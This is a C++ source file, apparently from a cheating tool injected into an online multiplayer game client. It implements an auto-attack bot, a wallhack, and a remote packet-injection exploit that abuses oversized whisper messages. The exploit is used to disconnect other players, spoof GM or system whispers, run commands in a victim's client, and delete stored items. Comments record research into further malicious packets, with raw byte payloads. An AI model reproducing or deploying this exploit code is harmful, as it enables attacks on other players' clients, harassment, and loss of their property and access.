#include <iostream>
#include <string>
#include <vector>

#include "cmd.h"
#include "utils.h"
#include "hooks.h"
#include "packet.h"
#include "player.h"

using namespace std;

const map<string, string> Command::help_msgs = {
	{"send",      "Send the packet built with the hexbuf. Syntax: send hexbuf"},
	{"move",      "Move to coords (x, y). Syntax: move type x y"},
	{"attack",    "Attack current target. Syntax: attack"},
	{"autodmg",   "Enable or disable the autodmg hack, which attracts and attacks every close enemy. Syntax: autodmg 0/1"},
	{"msg",       "Send a chat message. Syntax: msg type message"},
	{"wallhack",  "Enable or disable the wallhack. Syntax: wallhack 0/1"},
	{"dc",        "Start trying to disconnect the player. It sends by default 20 dc packets. Uses packet injection. Syntax: dc player [packets]"},
	{"dc_stop",   "Stop trying to disconnect the player. Syntax: dc_stop"},
	{"hack_life", "Executes a server command in another player's client. Uses packet injection. Syntax: hack_life player cmd"},
	{"whisp",     "Send a message to a player as if it had been sent by another player. Uses packet injection. Syntax: whisp type to_player from_player msg"},
	{"inj",       "Perform remote packet injection on player. Syntax: inj player hexbuf"},
	{"run",       "Run a server command. Syntax: run cmd"},
	{"porculing", "Attempt of knockback hack. Still being tested. Syntax: porculing"},
	{"ghostmode", "Attempt of ghostmode hack. Still being tested. Syntax: ghostmode"}
};
Command* const Command::instance = new Command();

void Command::set_target(uint target) {
	instance->target = target;
	print("New ID selected: " + to_string(target));
}

uint Command::get_target() {
	return instance->target;
}

void Command::update_enemy(uint id, int x, int y){
	if (instance->enemies.count(id)){
		instance->enemies[id].x = x;
		instance->enemies[id].y = y;
	} else {
		Enemy en = {x, y};
		instance->enemies[id] = en;
	}
}

void Command::delete_enemy(uint id){
	auto it = instance->enemies.find(id);
	if (it != instance->enemies.end())
		instance->enemies.erase(it);
	else
		cout << "[ERROR] Attempted to delete not existing enemy: " << id << endl;
}

bool Command::check_n_args(uint n, const vector<string>& cmd){
	return cmd.size() >= n+1;
}

void Command::help(){
	string msg = "Available help pages: ";
	for (auto p : help_msgs)
		msg += p.first + ", ";
	msg.erase(msg.end()-2, msg.end()); // remove last ", "
	print(msg);
}

void Command::help(const string& what){
	auto it = help_msgs.find(what);
	if (it != help_msgs.end())
		print_help(it->first, it->second);
	else
		print_err("No help page for " + what);
}

void Command::send(const string& hexbuf){
	Packet p(hex_to_string(hexbuf));
	p.send();
}

void Command::move(byte type, int x, int y){
	CG_Move p(type, 0, 0xc, x, y, 0);
	p.send();
}

void Command::attack(){
	if (instance->target){
		CG_Attack p(0, instance->target);
		p.send();
		print("Attacked target " + to_string(instance->target));
	} else print_err("There's no target.");
}

void Command::_autodmg(){
	while (instance->autodmg_enabled){
		for (auto it : instance->enemies){
			cout << "[BOT] Attacking " << it.first << endl;
			CG_Attack p(0, it.first);
			p.send();
			Sleep(10);
		}
	}
}

void Command::autodmg(bool enabled){
	instance->autodmg_enabled = enabled;
	if (enabled)
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_autodmg, 0, 0, 0);
}

// Processes a message in order to insert colors easily.
// Example: [FF0000]red[] normal [00FF00]green[]
string Command::process_msg(string msg){
	msg = replace_all(msg, "||", "|");
	size_t i1 = msg.find("["), i2, len;
	while (i1 != msg.npos){
		i2 = msg.find("]");
		if (i2 == msg.npos)
			break;
		len = i2-i1-1;
		if (len == 0)
			msg.replace(i1, len + 2, color());
		else if (len == 6)
			msg.replace(i1, len + 2, color(msg.substr(i1 + 1, len)));
		else
			print_err("Error processing color tag in message");
		i1 = msg.find("[", i1+1);
	}
	return msg;
}

void Command::msg(byte type, const string& msg){
	CG_Chat p(type, msg);
	p.send();
}

void Command::set_wallhack(bool enabled){
	objects::Player->wallhack_enabled = enabled;
	print(string("Set wallhack ") + (enabled ? "on." : "off."));
}

void Command::_packet_injection(const string& username, Packet* p){
	/*
	[INVESTIGACION]

	PROBLEMA: no puedo meter nullbytes.

	Probar a meter nullbytes con otros paquetes. Aunque parece demasiado locura.

	Probablemente pueda inyectar varios paquetes. Incluso probablemente pueda inyectarlos 
	seguidos en vez de en diferentes ejecuciones, poniendo otro paquete malicioso después.

	Paquetes sin nullbytes:
		whisper: enviar mensaje, posiblemente como gm
		TPacketGCItemDel (HEADER_GC_SAFEBOX_DEL o HEADER_GC_MALL_DEL): borrar cosas del almacen mientras esté abierto
		TPacketGCPhase: hace que el jugador solo vea el mapa y la UI y no pueda hacer nada
		puede que chat: creo que no, lo que pongo como nullbytes es el id del que habla y tiene nullbyte
			OJO que si, hay tipos de chat que no necesitan id
		puede que TPacketGCPoints (HEADER_GC_CHARACTER_POINTS). no soy capaz de recibirlo, y es muuy largo (255 ints)
		HEADER_GC_QUICKSLOT_ADD, HEADER_GC_QUICKSLOT_DEL, HEADER_GC_QUICKSLOT_SWAP: no muy util
		puede que TPacketGCWarp: parece que hacen falta unos ids que solo estan en el sv y seguro que tienen nullbytes, aunque hace cosas raras
			"\x04\x01\x01\x06\x01\x01\x01\x01\x03\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
		TPacketGCTargetCreate: si consigo crear un target con un id sin nullbytes puedo hacer muchas cosas
			Tiene pinta que lo crea pero las coordenadas X e Y tienen que tener nullbytes :(
			string packet = "\x7D\x01\x01\x01\x01";
			packet += "LAMADREQUELAPARIOAMENDIOSLAVIRGEN";
			packet += "\x01\x01\x01\x01\x01";
		TPacketGCLoverInfo, TPacketGCLovePointUpdate: parece que llegan bien pero npi de que hacen
			string packet = "\x83";
			packet += "HOLAQUETALMUCHOGUSTOJEJEJ";
			packet += "\x20";
	
	Si pudiera meter un solo nullbyte al final podria hacer muchas mas cosas, como por ejemplo
	GC_CharacterDel para volverme invisible, o tmb TPacketGCDead para matar a alguien
	Merece la pena investigar cómo.

	Haga lo que haga parece imposible meter un nullbyte en el paquete del whisper.
	Si lo meto, ahí termina el paquete, independientemente de la longitud que le haya puesto,
	y eso es lo que le llega al usuario, y justo después el siguiente paquete válido que enviamos.
	Podría meter un nullbyte al final si hubiera algún paquete cuyo header fuera '\x00',
	pero no lo hay.

	Lo suyo sería que después del paquete malicioso no hubiera nada más para poder aprovechar
	un posible nullbyte que hubiera en el buffer. Pero si no meto nada después del malicious
	packet no ocurre el bug, y siempre ocurre en la misma posición que no es al final.

	Me rindo

	Además de no poder nullbytes, falla más que las escopetillas de la feria. Parece que la
	tasa de acierto varía entre channel xd? No parece ser explotable de manera fiable

	[MALICIOUS PACKETS]
		- Whisper
		- Phase: "\xFD\x01"
		- Delete from safebox: "\x56\x01"
		- Chat (server command)
	*/

	string p_buf = p->get_buf();
	cout << "Performing packet injection to " << username << endl;
	cout << "[MALICIOUS PACKET] " << string_to_hex(p_buf) << endl;

	string buf;
	// padding
	for (int i = 0; i < INJ_PACKET_COUNT; i++)
		buf += CG_Whisper(username, string(INJ_PACKET_LEN, INJ_PADDING_BYTE)).get_buf();

	// more padding + injected packet
	buf += CG_Whisper(username, string(INJ_LAST_PACKET_PAD, INJ_PADDING_BYTE) + p_buf).get_buf();

	// Valid packet after malicious packet. Seems like it is not necessary anymore.
	//buf += CG_Whisper(username, string(202, ' ')).get_buf();

	Packet pkt(buf);
	pkt.send();
}

void Command::_disconnect() {
	// Maybe we can do it gradually checking if the character has already been disconnected or not
	cout << "[BOT] Sending " << instance->disconnect_packets << " packets to disconnect " << instance->username_dc << endl;
	int i = 0;
	while (instance->disconnecting && i < instance->disconnect_packets) {
		CG_Whisper p(instance->username_dc, to_string(i) + string(DISCONNECT_PACKET_LEN, DISCONNECT_BYTE) + to_string(i));
		p.send();
		//Sleep(1); // it could be good
		i++;
	}
	instance->disconnecting = false;
}

// Other option: do it the same as with packet injection, sendingall the packets at a time.
/*
void Command::_disconnect() {
	cout << "[BOT] Sending " << instance->disconnect_packets << " packets to disconnect " << instance->username_dc << endl;
	string buf;
	int i = 0;
	for (int i = 0; i < instance->disconnect_packets; i++){
		CG_Whisper p(instance->username_dc, string(DISCONNECT_PACKET_LEN, DISCONNECT_BYTE));
		buf += p.get_buf();
	}
	Packet p(buf);
	p.send();
	instance->disconnecting = false;
}*/


void Command::disconnect(const string& username, int n_packets){
	instance->username_dc = username;
	instance->disconnect_packets = n_packets;
	if (!instance->disconnecting){
		instance->disconnecting = true;
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_disconnect, 0, 0, 0);
	}
}

void Command::whisper(byte type, const string& to_user, string from_user, string msg) {
	// type 5 for gm, 0xFF for system
	from_user += string(25 - from_user.length(), ' ');
	// packet size: 0x101 ('\x01\x01'), minimum size with no nullbytes
	msg += string(0x101 - 25 - 4 - msg.length(), ' ');
	GC_Whisper p(type, from_user, msg);
	_packet_injection(to_user, &p);
}

void Command::packet_injection(const string& username, const string& hexbuf){
	Packet p(hex_to_string(hexbuf));
	_packet_injection(username, &p);
}

void Command::porculing(){
	// TESTING
	if (instance->target && instance->enemies.count(instance->target)){
		Enemy e = instance->enemies[instance->target];
		cout << "Attacking enemy " << instance->target << " at (" << e.x << ", " << e.y << ")" << endl;
		CG_Move p(3, 0x11, 0, e.x, e.y, 0);
		p.send();
		attack();
	} else
		print_err("Target not found!");
}

void Command::run_GC_command(const std::string& cmd){
	print("Running " + cmd);
	GC_Chat p(5, 0, cmd);
	p.recv();
}

void Command::hack_life(const string& username, const string& cmd){
	string msg = cmd;
	msg += string(0x101 - 9 - msg.length(), ' ');
	GC_Chat p(5, 0x01010101, msg);

	_packet_injection(username, &p);
	print("Hacked life");
}

void Command::ghostmode(){
	// TESTING
	string buf;
	Packet p;
	
	// Fase
	/*buf = "\xFD\x05";
	p = Packet(buf);
	p.recv();*/

	// Char del
	GC_CharacterDel p2(objects::Player->id);
	p2.recv();
	/*
	// OJO AL WARNING QUE DA
	// transformar coords abs a rel?
	// Char add
	//GC_CharacterAdd p3(objects::Player->id, 0, objects::Player->x, objects::Player->y, objects::Player->z,
	GC_CharacterAdd p3(objects::Player->id, 0, 0, 0, 0,
		6, 0x200, 0x64, 0x64);
	p3.recv();

	// Chat additional info
	buf = "\x88";
	buf += string((char*)&objects::Player->id, 4);
	buf += hex_to_string("4B6C65636B6F35000000000000000000000000000000000000000000000000000003000000000100000001000300000000");


	// Points (hp)
	buf = hex_to_string("11000000");
	buf += string((char*)&objects::Player->id, 4);
	buf += hex_to_string("050000000032000000");
	p = Packet(buf);
	p.recv();

	// Char update
	buf = "\x13";
	buf += string((char*)&objects::Player->id, 4);
	buf += hex_to_string("000000000000000064640000000008000000000000000001000300000000");
	p = Packet(buf);
	p.recv();
	
	// No idea
	buf = hex_to_string("7ED700000000000000001C0000000500000000000000");
	p = Packet(buf);
	p.recv();*/
}

void Command::run(const string& _cmd){
	bool check = true;
	vector<string> cmd = split(_cmd, ' ');
	if (!check_n_args(0, cmd)) // Avoid empty commands
		return;

	if (cmd[0] == "help") {
		if (check_n_args(1, cmd))
			help(cmd[1]);
		else
			help();

	} else if (cmd[0] == "send") {
		if (check = check_n_args(1, cmd))
			send(cmd[1]);

	} else if (cmd[0] == "move") {
		if (check = check_n_args(3, cmd))
			move(stoi(cmd[1]), stoi(cmd[2]), stoi(cmd[3]));

	} else if (cmd[0] == "attack") {
		if (check = check_n_args(0, cmd))
			attack();

	} else if (cmd[0] == "autodmg") {
		if (check = check_n_args(1, cmd))
			autodmg((bool)stoi(cmd[1]));
	
	} else if (cmd[0] == "msg"){
		if (check = check_n_args(2, cmd))
			msg(stoi(cmd[1]), cmd[2]);

	} else if (cmd[0] == "wallhack"){
		if (check = check_n_args(1, cmd))
			set_wallhack((bool)stoi(cmd[1]));

	} else if (cmd[0] == "dc"){
		if (check = check_n_args(1, cmd))
			if (check_n_args(2, cmd))
				disconnect(cmd[1], stoi(cmd[2]));
			else
				disconnect(cmd[1]);

	} else if (cmd[0] == "dc_stop"){
		instance->disconnecting = false;

	} else if (cmd[0] == "hack_life"){
		if (check = check_n_args(2, cmd)) {
			string msg;
			for (auto it = cmd.begin() + 2; it != cmd.end(); ++it)
				msg += *it + " ";
			hack_life(cmd[1], msg);
		}

	} else if (cmd[0] == "whisp"){
		if (check = check_n_args(4, cmd)){
			string msg;
			for (auto it = cmd.begin()+4; it != cmd.end(); ++it)
				msg += *it + " ";
			whisper(stoi(cmd[1]), cmd[2], cmd[3], msg);
		}

	} else if (cmd[0] == "inj"){
		if (check = check_n_args(2, cmd))
			packet_injection(cmd[1], cmd[2]);

	} else if (cmd[0] == "run") {
		if (check = check_n_args(1, cmd)) {
			string msg;
			for (auto it = cmd.begin() + 1; it != cmd.end(); ++it)
				msg += *it + " ";
			run_GC_command(msg);
		}

	} else if (cmd[0] == "porculing"){
		porculing();

	} else if (cmd[0] == "ghostmode"){
		ghostmode();

	} else {
		print_err("Unknown command: " + cmd[0]);
		help();
	}

	if (!check){
		print_err("Bad arguments!");
		help(cmd[0]);
	}
}